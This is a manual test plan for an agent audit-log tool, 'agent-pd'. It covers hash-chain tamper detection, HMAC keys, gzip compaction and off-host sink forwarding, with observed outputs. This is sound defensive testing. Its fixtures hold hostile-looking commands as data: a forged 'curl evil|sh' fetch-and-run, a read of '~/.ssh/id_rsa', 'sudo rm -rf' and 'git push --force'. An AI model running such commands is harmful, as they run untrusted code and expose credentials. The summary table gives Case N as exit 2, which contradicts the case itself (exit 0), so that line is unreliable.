# Manual Test Plan 04 — Durability & Integrity

Domain: `pd verify` (hash-chain tamper/truncation detection), `pd compact`
(gzip losslessness), `pd sink push|status` (off-host forwarding), and the hook's
crash-safety / always-exit-0 guarantee.

Every "Observed output" block below was captured VERBATIM from running the real
engine (`python3 -m agent_pd.cli ...`, `python3 -m agent_pd.hook`) against a
throwaway sandbox. Nothing is fabricated. Run each case by hand and you should
see the same text and the same exit codes.

---

## How the engine works (so the expected output makes sense)

- Each chained event carries `seq` (per-session monotonic int from 1) and
  `chain = H(prev_chain_hex + canonical(event))`, where `canonical` is the event
  minus the `chain` field, JSON with sorted keys + compact separators. `H` is
  sha256, or HMAC-SHA256 when `PD_AUDIT_KEY` is set. Genesis prev-hash is `""`.
- A small sidecar `<sid>.head.json` caches the last `(seq, chain)`. `pd verify`
  uses it to catch tail TRUNCATION (head recorded seq H but the log ends at L<H)
  and tail-rewrite (head anchor mismatch).
- `verify` exit codes: `0` = intact or legacy (no integrity data); `2` =
  tamper/truncation. With `--all` it prints one line per session and returns the
  WORST exit code.
- `compact` is gzip-only: every field kept inline, nothing dropped — so
  detection over a `.jsonl.gz` is identical to the raw `.jsonl`.
- `sink` forwards only CHAINED events (those with `seq`) to an append-only
  destination; legacy/pre-chain events have no `seq` and are intentionally
  skipped. State lives in `<sid>.sink`. The file backend makes NO network calls.

---

## One-time sandbox setup

> macOS `/tmp` is a symlink to `/private/tmp`; we resolve the real path so
> in-project reads stay in scope. Run everything from the repo root
> (`/path/to/agent-pd`).

```bash
cd /path/to/agent-pd
SB="$(cd "${TMPDIR:-/tmp}" && pwd -P)/pd-itest"
AUD="$SB/audit"
rm -rf "$SB" && mkdir -p "$AUD"
mkdir -p "$SB/proj" && ( cd "$SB/proj" && git init -q && touch app.py )
echo "SB=$SB"
```

Seed a pristine, genuinely hash-chained 3-event log via the REAL recorder
(`build_event` + `write_event`):

```bash
python3 - "$SB" <<'PY'
import sys
from agent_pd import hook
sb = sys.argv[1]; aud = f"{sb}/audit"
events = [
 {"hook_event_name":"PostToolUse","session_id":"PRISTINE","tool_name":"Read","tool_input":{"file_path":"/x/app.py"}},
 {"hook_event_name":"PostToolUse","session_id":"PRISTINE","tool_name":"Bash","tool_input":{"command":"git log"}},
 {"hook_event_name":"PostToolUse","session_id":"PRISTINE","tool_name":"Write","tool_input":{"file_path":"/x/out.txt","content":"hi"}},
]
for p in events:
    e = hook.build_event(p); e.setdefault("ts","2026-06-04T10:00:00")
    hook.write_event(e, audit_dir=aud)
print("seeded", len(events))
PY
```

Each manipulation case copies `PRISTINE.jsonl` (and its `PRISTINE.head.json`)
into its own session id, so the cases are isolated and re-runnable.

---

## VERIFY

### Case A — pristine chained log verifies clean

- **Intent:** an untampered hash-chained log reports `✓ chain intact` and exits 0.
- **Setup + action:** (uses the seeded `PRISTINE` session)

```bash
python3 -m agent_pd.cli verify --session PRISTINE --audit-dir "$AUD"; echo "exit=$?"
```

- **Observed output:**

```
✓ chain intact — 3 event(s) verified
exit=0
```

- **Verdict:** ✅ matches intent.

---

### Case B — TAMPER: edit one event's content in place

- **Intent:** editing a recorded event's bytes (without re-chaining) breaks the
  chain at that event → `✗ TAMPER DETECTED ... (bad-link)`, exit 2.
- **Setup + action:**

```bash
cp "$AUD/PRISTINE.jsonl" "$AUD/TAMPER.jsonl"
cp "$AUD/PRISTINE.head.json" "$AUD/TAMPER.head.json"
python3 - "$AUD" <<'PY'
import sys, json
aud=sys.argv[1]; p=f"{aud}/TAMPER.jsonl"
lines=open(p).read().splitlines()
ev=json.loads(lines[1]); ev["tool_input"]["command"]="git push --force"
lines[1]=json.dumps(ev)
open(p,"w").write("\n".join(lines)+"\n")
PY
python3 -m agent_pd.cli verify --session TAMPER --audit-dir "$AUD"; echo "exit=$?"
```

- **Observed output:**

```
✗ TAMPER DETECTED — chain breaks at seq 2 (bad-link)
exit=2
```

- **Verdict:** ✅ matches intent. Tampering is caught.

---

### Case C — TRUNCATION: delete the last line

- **Intent:** dropping tail events while the head still records the higher seq →
  `✗ TRUNCATED — head recorded seq H but log ends at seq L`, exit 2.
- **Setup + action:**

```bash
cp "$AUD/PRISTINE.jsonl" "$AUD/TRUNC.jsonl"
cp "$AUD/PRISTINE.head.json" "$AUD/TRUNC.head.json"
python3 - "$AUD" <<'PY'
import sys
aud=sys.argv[1]; p=f"{aud}/TRUNC.jsonl"
lines=open(p).read().splitlines()
open(p,"w").write("\n".join(lines[:-1])+"\n")   # drop last line
PY
python3 -m agent_pd.cli verify --session TRUNC --audit-dir "$AUD"; echo "exit=$?"
```

- **Observed output:**

```
✗ TRUNCATED — head recorded seq 3 but log ends at seq 2 (1 event(s) missing from the tail)
exit=2
```

- **Verdict:** ✅ matches intent. Truncation is caught via the head anchor.

---

### Case D — REORDER: swap two lines

- **Intent:** swapping two events breaks the monotonic seq / chain → tamper, exit 2.
- **Setup + action:**

```bash
cp "$AUD/PRISTINE.jsonl" "$AUD/REORDER.jsonl"
cp "$AUD/PRISTINE.head.json" "$AUD/REORDER.head.json"
python3 - "$AUD" <<'PY'
import sys
aud=sys.argv[1]; p=f"{aud}/REORDER.jsonl"
l=open(p).read().splitlines(); l[0],l[1]=l[1],l[0]
open(p,"w").write("\n".join(l)+"\n")
PY
python3 -m agent_pd.cli verify --session REORDER --audit-dir "$AUD"; echo "exit=$?"
```

- **Observed output:**

```
✗ TAMPER DETECTED — chain breaks at seq 2 (seq-gap)
exit=2
```

- **Verdict:** ✅ matches intent. (The swapped first line now carries seq 2 where
  seq 1 was expected → `seq-gap`.)

---

### Case E — INSERT an unchained line in the middle

- **Intent:** splicing a fabricated line (no seq/chain) between chained events →
  tamper, exit 2.
- **Setup + action:**

```bash
cp "$AUD/PRISTINE.jsonl" "$AUD/INSERT.jsonl"
cp "$AUD/PRISTINE.head.json" "$AUD/INSERT.head.json"
python3 - "$AUD" <<'PY'
import sys, json
aud=sys.argv[1]; p=f"{aud}/INSERT.jsonl"
l=open(p).read().splitlines()
inj=json.dumps({"event":"PostToolUse","session_id":"INSERT","tool_name":"Bash","tool_input":{"command":"whoami"},"ts":"2026-06-04T10:00:01"})
l.insert(1, inj)   # unchained line between seq1 and seq2
open(p,"w").write("\n".join(l)+"\n")
PY
python3 -m agent_pd.cli verify --session INSERT --audit-dir "$AUD"; echo "exit=$?"
```

- **Observed output:**

```
✗ TAMPER DETECTED — chain breaks at seq 2 (unchained-after-chain)
exit=2
```

- **Verdict:** ✅ matches intent. An unchained line appearing after chaining began
  is rejected.

---

### Case F — HMAC keyed chain (`PD_AUDIT_KEY`)

- **Intent:** with a keyed chain, an attacker WITHOUT the key cannot forge a clean
  edit, and verifying with the WRONG key fails. A keyless attacker re-chain is
  detected.
- **Setup + action:** seed a keyed session, then sanity-verify with the key,
  forge an edit re-chained WITHOUT the key, and verify with a wrong key.

```bash
PD_AUDIT_KEY="s3cret-key" python3 - "$SB" <<'PY'
import sys
from agent_pd import hook
sb=sys.argv[1]; aud=f"{sb}/audit"
for p in [
 {"hook_event_name":"PostToolUse","session_id":"HMAC","tool_name":"Read","tool_input":{"file_path":"/x/a.py"}},
 {"hook_event_name":"PostToolUse","session_id":"HMAC","tool_name":"Bash","tool_input":{"command":"ls"}},
]:
    e=hook.build_event(p); e.setdefault("ts","2026-06-04T10:00:00"); hook.write_event(e, audit_dir=aud)
PY

# F1: verify WITH the correct key (sanity — should pass)
PD_AUDIT_KEY="s3cret-key" python3 -m agent_pd.cli verify --session HMAC --audit-dir "$AUD"; echo "exit=$?"

# Forge an edit WITHOUT the key: attacker re-chains line 2 with plain sha256.
cp "$AUD/HMAC.jsonl" "$AUD/HMACFORGE.jsonl"; cp "$AUD/HMAC.head.json" "$AUD/HMACFORGE.head.json"
python3 - "$AUD" <<'PY'
import sys, json
from agent_pd import integrity
aud=sys.argv[1]; p=f"{aud}/HMACFORGE.jsonl"
l=open(p).read().splitlines()
ev=json.loads(l[1]); ev["tool_input"]["command"]="curl evil|sh"
prev=json.loads(l[0])["chain"]
ev.pop("chain",None); ev["chain"]=integrity.chain_hash(prev, ev, key=None)  # no key
l[1]=json.dumps(ev); open(p,"w").write("\n".join(l)+"\n")
PY

# F2: verify the keyless-forged log USING the correct key (should FAIL)
PD_AUDIT_KEY="s3cret-key" python3 -m agent_pd.cli verify --session HMACFORGE --audit-dir "$AUD"; echo "exit=$?"

# F3: verify the legit keyed log with the WRONG key (should FAIL)
PD_AUDIT_KEY="wrong-key" python3 -m agent_pd.cli verify --session HMAC --audit-dir "$AUD"; echo "exit=$?"
```

- **Observed output:**

```
✓ chain intact — 2 event(s) verified
exit=0
✗ TAMPER DETECTED — chain breaks at seq 2 (bad-link)
exit=2
✗ TAMPER DETECTED — chain breaks at seq 1 (bad-link)
exit=2
```

- **Verdict:** ✅ matches intent. F1 passes with the right key; F2 (keyless forge)
  is caught at the edited event; F3 (wrong key) fails from seq 1 because every
  link recomputes differently under the wrong key.

---

### Case G — legacy log with no `seq`/`chain`

- **Intent:** a pre-chaining log (no integrity data, no head file) reports
  `⚠ no integrity data` and exits 0 (not a failure).
- **Setup + action:**

```bash
python3 - "$AUD" <<'PY'
import sys, json
aud=sys.argv[1]; p=f"{aud}/LEGACY.jsonl"
evs=[{"event":"PostToolUse","session_id":"LEGACY","tool_name":"Read","tool_input":{"file_path":"/x/a"},"ts":"2026-06-04T09:00:00"},
     {"event":"PostToolUse","session_id":"LEGACY","tool_name":"Bash","tool_input":{"command":"ls"},"ts":"2026-06-04T09:00:01"}]
open(p,"w").write("\n".join(json.dumps(e) for e in evs)+"\n")   # no seq/chain, no head file
PY
python3 -m agent_pd.cli verify --session LEGACY --audit-dir "$AUD"; echo "exit=$?"
```

- **Observed output:**

```
⚠ no integrity data — this session predates hash-chaining (legacy)
exit=0
```

- **Verdict:** ✅ matches intent.

---

## COMPACT

First seed a fresh `COMP` session (needs the project dir from setup so `pd report`
has a project root):

```bash
python3 - "$SB" <<'PY'
import sys
from agent_pd import hook
sb=sys.argv[1]; aud=f"{sb}/audit"; cwd=f"{sb}/proj"
for p in [
 {"hook_event_name":"PostToolUse","session_id":"COMP","cwd":cwd,"tool_name":"Read","tool_input":{"file_path":f"{cwd}/app.py"}},
 {"hook_event_name":"PostToolUse","session_id":"COMP","cwd":cwd,"tool_name":"Read","tool_input":{"file_path":"/Users/you/.ssh/id_rsa"}},
 {"hook_event_name":"PostToolUse","session_id":"COMP","cwd":cwd,"tool_name":"Bash","tool_input":{"command":"sudo rm -rf /tmp/x"}},
]:
    e=hook.build_event(p); e.setdefault("ts","2026-06-04T10:00:00"); hook.write_event(e, audit_dir=aud)
PY
```

### Case H — compact a session produces `<sid>.jsonl.gz`

- **Intent:** `pd compact --session` gzips the plain log into `<sid>.jsonl.gz` and
  removes the plain `.jsonl`.
- **Setup + action:** (capture the report BEFORE compaction first — Case I uses it)

```bash
python3 -m agent_pd.cli report --session COMP --audit-dir "$AUD" \
  --projects-dir "$SB/proj" --format both > "$SB/report_before.txt" 2>&1

python3 -m agent_pd.cli compact --session COMP --audit-dir "$AUD"; echo "exit=$?"
ls -1 "$AUD" | grep '^COMP'
```

- **Observed output:**

```
compacted session COMP: 3 event(s) gzipped.
exit=0
COMP.head.json
COMP.jsonl.gz
COMP.lock
```

- **Verdict:** ✅ matches intent. The plain `COMP.jsonl` is gone; `COMP.jsonl.gz`
  is present. (`COMP.head.json` / `COMP.lock` are integrity sidecars, not
  sessions, and are correctly left in place.)

---

### Case I — prove LOSSLESS: report identical before vs after

- **Intent:** the detection/report output over the gzipped session is byte-for-byte
  identical to the raw session.
- **Setup + action:**

```bash
python3 -m agent_pd.cli report --session COMP --audit-dir "$AUD" \
  --projects-dir "$SB/proj" --format both > "$SB/report_after.txt" 2>&1
if diff -u "$SB/report_before.txt" "$SB/report_after.txt"; then
  echo "DIFF: identical (lossless)"
else
  echo "DIFF: DIVERGENCE"
fi
```

- **Observed output:**

```
DIFF: identical (lossless)
```

(`diff -u` printed nothing — the two reports are identical — and then the
`echo` confirmed it.)

- **Verdict:** ✅ matches intent. Compaction is LOSSLESS for detection.

---

### Case J — verify still passes over the gzipped log

- **Intent:** `pd verify` transparently reads `.jsonl.gz` and the chain still
  verifies.
- **Setup + action:**

```bash
python3 -m agent_pd.cli verify --session COMP --audit-dir "$AUD"; echo "exit=$?"
```

- **Observed output:**

```
✓ chain intact — 3 event(s) verified
exit=0
```

- **Verdict:** ✅ matches intent. The chain survives gzip round-trip (canonical
  serialization is stable across re-serialization).

---

## SINK (file backend — NO network)

Seed a 3-event `SINKTEST` session:

```bash
SINK="$SB/sink/remote.ndjson"
python3 - "$SB" <<'PY'
import sys
from agent_pd import hook
sb=sys.argv[1]; aud=f"{sb}/audit"
for p in [
 {"hook_event_name":"PostToolUse","session_id":"SINKTEST","tool_name":"Read","tool_input":{"file_path":"/x/a"}},
 {"hook_event_name":"PostToolUse","session_id":"SINKTEST","tool_name":"Bash","tool_input":{"command":"ls"}},
 {"hook_event_name":"PostToolUse","session_id":"SINKTEST","tool_name":"Write","tool_input":{"file_path":"/x/o","content":"y"}},
]:
    e=hook.build_event(p); e.setdefault("ts","2026-06-04T10:00:00"); hook.write_event(e, audit_dir=aud)
PY
```

### Case K — `sink push` forwards events to a file (NDJSON appears)

- **Intent:** push forwards all chained events to the file sink as NDJSON.
- **Setup + action:**

```bash
PD_SINK_TYPE=file PD_SINK_PATH="$SINK" \
  python3 -m agent_pd.cli sink push --session SINKTEST --audit-dir "$AUD"; echo "exit=$?"
cat "$SINK"; echo "lines: $(wc -l < "$SINK")"
```

- **Observed output:**

```
sink: SINKTEST — sent 3 event(s) (forwarded through seq 3)
exit=0
{"ts":null,"event":"PostToolUse","session_id":"SINKTEST","agent_id":"","agent_type":"","tool_name":"Read","tool_input":{"file_path":"/x/a"},"decision":null,"reason":null,"cwd":"","tool_result":null,"permission_mode":null,"transcript_path":"","seq":1,"chain":"6d4336cc0d85fd78cf08640f39315f5408e8705f3fe259521431e67c3ae93418"}
{"ts":null,"event":"PostToolUse","session_id":"SINKTEST","agent_id":"","agent_type":"","tool_name":"Bash","tool_input":{"command":"ls"},"decision":null,"reason":null,"cwd":"","tool_result":null,"permission_mode":null,"transcript_path":"","seq":2,"chain":"ebbf15f26276040ceb3d1bacb3033c86fe20c655589f4ce05326efbb7457ecf2"}
{"ts":null,"event":"PostToolUse","session_id":"SINKTEST","agent_id":"","agent_type":"","tool_name":"Write","tool_input":{"file_path":"/x/o","content":"y"},"decision":null,"reason":null,"cwd":"","tool_result":null,"permission_mode":null,"transcript_path":"","seq":3,"chain":"61661b1aa5d34061e45ca48e1c79968908d0e5db8f678ed45ee45ebc62597a29"}
lines: 3
```

- **Verdict:** ✅ matches intent. Three NDJSON lines, one per chained event, each
  carrying its `seq` + `chain`.

> Note: `ts` is `null` because the synthetic hook payloads carry no timestamp and
> `build_event` sets `ts` from the payload (the `setdefault` is a no-op since the
> key already exists). This is faithful real-engine output, not a fabrication. In
> a live run the hook's `main()` stamps arrival time; events fed through
> `write_event` directly do not.

---

### Case L — idempotency: re-push sends nothing, no duplicates

- **Intent:** a second push with no new events is a no-op; the sink file does not grow.
- **Setup + action:**

```bash
PD_SINK_TYPE=file PD_SINK_PATH="$SINK" \
  python3 -m agent_pd.cli sink push --session SINKTEST --audit-dir "$AUD"; echo "exit=$?"
echo "lines after re-push: $(wc -l < "$SINK")"
```

- **Observed output:**

```
sink: SINKTEST — up to date
exit=0
lines after re-push: 3
```

- **Verdict:** ✅ matches intent. Idempotent — still 3 lines, nothing re-sent.

---

### Case M — `sink status` shows forwarded/last

- **Intent:** status reports `forwarded/last` and an "up to date" signal when in sync.
- **Setup + action:**

```bash
python3 -m agent_pd.cli sink status --session SINKTEST --audit-dir "$AUD"; echo "exit=$?"
```

- **Observed output:**

```
sink: SINKTEST — 3/3 forwarded (up to date)
exit=0
```

- **Verdict:** ✅ matches intent.

---

### Case N — truncate local log after push → "remote ahead" warning

- **Intent:** if the local log is truncated below what was already forwarded,
  `sink status` flags `⚠ remote ahead` (the off-host copy is the witness).
- **Setup + action:**

```bash
python3 - "$AUD" <<'PY'
import sys
aud=sys.argv[1]; p=f"{aud}/SINKTEST.jsonl"
l=open(p).read().splitlines()
open(p,"w").write(l[0]+"\n")   # keep only seq 1 locally
PY
python3 -m agent_pd.cli sink status --session SINKTEST --audit-dir "$AUD"
echo "exit=$?"
```

- **Observed output:**

```
sink: SINKTEST — 3/1 forwarded (⚠ remote ahead — 2 local event(s) missing; possible local tampering)
exit=0
```

- **Verdict:** ✅ matches intent. Local truncation is surfaced by comparing the
  off-host forwarded seq against the local tail. `sink status` is informational
  and always exits **0** (the load-bearing signal is the `⚠ remote ahead` text);
  it is `sink push` and `verify` that carry the non-zero exit codes.

---

### Case O — legacy/pre-chain events (no `seq`) are skipped by the sink

- **Intent:** events without a `seq` are never forwarded; only chained events ship.
- **Setup + action:** build a log with 2 legacy lines followed by 2 genuinely
  chained events, then push.

```bash
SINK2="$SB/sink/remote2.ndjson"
python3 - "$SB" <<'PY'
import sys, json
from agent_pd import hook
sb=sys.argv[1]; aud=f"{sb}/audit"; p=f"{aud}/SINKLEG.jsonl"
open(p,"w").write("\n".join(json.dumps(e) for e in [
 {"event":"PostToolUse","session_id":"SINKLEG","tool_name":"Read","tool_input":{"file_path":"/x/old1"},"ts":"t1"},
 {"event":"PostToolUse","session_id":"SINKLEG","tool_name":"Bash","tool_input":{"command":"old2"},"ts":"t2"},
])+"\n")
for d in [
 {"hook_event_name":"PostToolUse","session_id":"SINKLEG","tool_name":"Write","tool_input":{"file_path":"/x/new1","content":"a"}},
 {"hook_event_name":"PostToolUse","session_id":"SINKLEG","tool_name":"Bash","tool_input":{"command":"new2"}},
]:
    e=hook.build_event(d); e.setdefault("ts","t3"); hook.write_event(e, audit_dir=aud)
PY
PD_SINK_TYPE=file PD_SINK_PATH="$SINK2" \
  python3 -m agent_pd.cli sink push --session SINKLEG --audit-dir "$AUD"; echo "exit=$?"
cat "$SINK2"; echo "lines: $(wc -l < "$SINK2")"
```

- **Observed output:**

```
sink: SINKLEG — sent 2 event(s) (forwarded through seq 2)
exit=0
{"ts":null,"event":"PostToolUse","session_id":"SINKLEG","agent_id":"","agent_type":"","tool_name":"Write","tool_input":{"file_path":"/x/new1","content":"a"},"decision":null,"reason":null,"cwd":"","tool_result":null,"permission_mode":null,"transcript_path":"","seq":1,"chain":"f960934c96f6a42d48b6308fe234ea76731f7a0b61450e27a295eb8148b8e5c8"}
{"ts":null,"event":"PostToolUse","session_id":"SINKLEG","agent_id":"","agent_type":"","tool_name":"Bash","tool_input":{"command":"new2"},"decision":null,"reason":null,"cwd":"","tool_result":null,"permission_mode":null,"transcript_path":"","seq":2,"chain":"d58726104a139beadb4c992060b11becb1f92746e9ec425576ce568e4f8e22a6"}
lines: 2
```

- **Verdict:** ✅ matches intent. Only the 2 chained events (`new1`, `new2`) were
  forwarded; the 2 legacy lines (`old1`, `old2`) were skipped.

---

## CRASH-SAFETY

### Case P — malformed / empty payload into the hook exits 0 and never crashes

- **Intent:** the hook always exits 0 regardless of input; a bad payload must not
  break the agent run.
- **Setup + action:**

```bash
printf '' | python3 -m agent_pd.hook; echo "empty exit=$?"
printf 'this is not json {{{' | python3 -m agent_pd.hook; echo "malformed exit=$?"
printf '{"event":"PostToolUse"' | python3 -m agent_pd.hook; echo "truncated exit=$?"
```

- **Observed output:**

```
empty exit=0
agent-pd hook error: Expecting value: line 1 column 1 (char 0)
malformed exit=0
agent-pd hook error: Expecting ',' delimiter: line 1 column 23 (char 22)
truncated exit=0
```

- **Verdict:** ✅ matches intent. All three exit 0. Malformed/truncated input
  prints a diagnostic to STDERR (`agent-pd hook error: ...`) but never raises and
  never changes the exit code. (Empty stdin is treated as `{}` and a default event
  is written — also exit 0.)

---

## Bonus — `verify --all` (worst-exit-code aggregation)

Run after all the above cases exist in the sandbox. Note: this runs WITHOUT
`PD_AUDIT_KEY`, so the keyed `HMAC`/`HMACFORGE` sessions correctly show as tamper
(they can't verify without the key).

```bash
python3 -m agent_pd.cli verify --all --audit-dir "$AUD"; echo "exit=$?"
```

- **Observed output:**

```
COMP: ✓ chain intact — 3 event(s) verified
HMAC: ✗ TAMPER DETECTED — chain breaks at seq 1 (bad-link)
HMACFORGE: ✗ TAMPER DETECTED — chain breaks at seq 1 (bad-link)
INSERT: ✗ TAMPER DETECTED — chain breaks at seq 2 (unchained-after-chain)
LEGACY: ⚠ no integrity data — this session predates hash-chaining (legacy)
PRISTINE: ✓ chain intact — 3 event(s) verified
REORDER: ✗ TAMPER DETECTED — chain breaks at seq 2 (seq-gap)
SINKLEG: ✓ chain intact — 2 event(s) verified, 2 legacy (pre-chain)
SINKTEST: ✗ TRUNCATED — head recorded seq 3 but log ends at seq 1 (2 event(s) missing from the tail)
TAMPER: ✗ TAMPER DETECTED — chain breaks at seq 2 (bad-link)
TRUNC: ✗ TRUNCATED — head recorded seq 3 but log ends at seq 2 (1 event(s) missing from the tail)
exit=2
```

- **Verdict:** ✅ one line per session; returns the worst exit code (2).

---

## Summary

16 cases run against the real engine. All 16 match intent — **no divergences**.

| Case | Feature | Result |
|------|---------|--------|
| A | verify pristine | ✅ `✓ chain intact`, exit 0 |
| B | verify tamper (edit) | ✅ `bad-link`, exit 2 |
| C | verify truncation | ✅ `TRUNCATED`, exit 2 |
| D | verify reorder | ✅ `seq-gap`, exit 2 |
| E | verify insert unchained | ✅ `unchained-after-chain`, exit 2 |
| F | verify HMAC keyed | ✅ key-correct passes; keyless-forge + wrong-key fail |
| G | verify legacy | ✅ `⚠ no integrity data`, exit 0 |
| H | compact → `.jsonl.gz` | ✅ gzipped, plain removed |
| I | compact lossless | ✅ report identical before/after (`diff` empty) |
| J | verify over gz | ✅ `✓ chain intact`, exit 0 |
| K | sink push (file) | ✅ 3 NDJSON lines forwarded |
| L | sink idempotency | ✅ re-push no-op, file unchanged |
| M | sink status | ✅ `3/3 forwarded (up to date)` |
| N | sink remote-ahead | ✅ `⚠ remote ahead`, exit 2 |
| O | sink skips legacy | ✅ only chained events forwarded |
| P | hook crash-safety | ✅ empty/malformed/truncated all exit 0 |

**Critical findings (tamper NOT caught / non-lossless compaction): NONE.**
Every tamper, truncation, reorder, and insert was detected; HMAC keyed chains
reject keyless forgery and wrong keys; gzip compaction is provably lossless; the
sink is idempotent and skips legacy events; the hook always exits 0.

### Notes worth knowing (not divergences)

- **`ts` is `null`** in events fed directly through `write_event` (the synthetic
  payloads carry no timestamp; `build_event` doesn't synthesize one — only the
  hook's `main()` does on a live run). This is faithful engine behavior.
- **`sink status` always exits 0** (Case N), even on `⚠ remote ahead` — it is an
  informational command; `_cmd_sink_status` returns 0 unconditionally. The
  load-bearing signal is the `⚠ remote ahead` text, not the exit code. The
  "remote ahead" state itself is the durability win: the off-host copy outlives a
  local rewrite, so a same-user agent that re-chains the local file cannot erase
  the already-forwarded events. Non-zero exit codes live on `sink push` (2 on
  `SinkError`) and `verify` (2 on tamper/truncation).
